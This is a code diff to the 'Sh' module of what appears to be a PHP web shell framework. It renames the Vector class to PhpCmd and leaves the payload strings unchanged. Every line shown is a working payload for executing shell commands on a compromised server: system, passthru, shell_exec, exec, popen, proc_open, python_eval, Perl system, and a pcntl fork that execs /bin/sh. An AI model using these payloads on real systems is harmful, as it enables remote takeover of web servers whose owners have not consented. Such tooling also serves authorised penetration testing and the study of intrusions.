@@ -1,4 +1,4 @@
-from core.vector import Os, Vector
+from core.vector import PhpCmd, Os
 from core.module import Module
 from core.loggers import log
 from core import messages
@@ -42,16 +42,16 @@ class Sh(Module):
 
         self._register_vectors(
             [
-                Vector("""@system("${args['command']}${args['stderr_redirection']}");""", "system"),
-                Vector("@passthru('${args['command']}${args['stderr_redirection']}');", "passthru"),
-                Vector("print(@shell_exec('${args['command']}${args['stderr_redirection']}'));", "shell_exec"),
-                Vector("$r=array(); @exec('${args['command']}${args['stderr_redirection']}', $r);print(join(\"\\n\",$r));", "exec"),
-                Vector("$h=@popen('${args['command']}','r'); if($h) { while(!feof($h)) echo(fread($h,4096)); pclose($h); }", "popen"),
-                Vector("""$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));$h = @proc_open('${args['command']}', $p, $pipes); if($h&&$pipes) { while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);fclose($pipes[2]); proc_close($h); }""", "proc_open"),
-                Vector("@python_eval('import os; os.system('${args['command']}${args['stderr_redirection']}');');", "python_eval"),
-                Vector("if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('${args['command']}${args['stderr_redirection']}'); print($r); }", "perl_system"),
+                PhpCmd("""@system("${args['command']}${args['stderr_redirection']}");""", "system"),
+                PhpCmd("@passthru('${args['command']}${args['stderr_redirection']}');", "passthru"),
+                PhpCmd("print(@shell_exec('${args['command']}${args['stderr_redirection']}'));", "shell_exec"),
+                PhpCmd("$r=array(); @exec('${args['command']}${args['stderr_redirection']}', $r);print(join(\"\\n\",$r));", "exec"),
+                PhpCmd("$h=@popen('${args['command']}','r'); if($h) { while(!feof($h)) echo(fread($h,4096)); pclose($h); }", "popen"),
+                PhpCmd("""$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));$h = @proc_open('${args['command']}', $p, $pipes); if($h&&$pipes) { while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);fclose($pipes[2]); proc_close($h); }""", "proc_open"),
+                PhpCmd("@python_eval('import os; os.system('${args['command']}${args['stderr_redirection']}');');", "python_eval"),
+                PhpCmd("if(class_exists('Perl')) { $perl = new Perl(); $r = $perl->system('${args['command']}${args['stderr_redirection']}'); print($r); }", "perl_system"),
                 # pcntl_fork is unlikely, cause is callable just as CGI or from CLI.
-                Vector("""$p=@pcntl_fork(); if(!$p){@pcntl_exec("/bin/sh",Array("-c","${args['command']}"));} else {@pcntl_waitpid($p,$status);}""",
+                PhpCmd("""$p=@pcntl_fork(); if(!$p){@pcntl_exec("/bin/sh",Array("-c","${args['command']}"));} else {@pcntl_waitpid($p,$status);}""",
                     name="pcntl", target=Os.NIX),
             ])
 
@@ -85,7 +85,7 @@ class Sh(Module):
           names = [ args.get('vector', '') ],
             arguments = args_check,
             condition = lambda result: self.session['shell_php'].get('enabled') and result == check_digits
-                                        )
+            )
 
         self._store_arg('vector', vector_name)
 
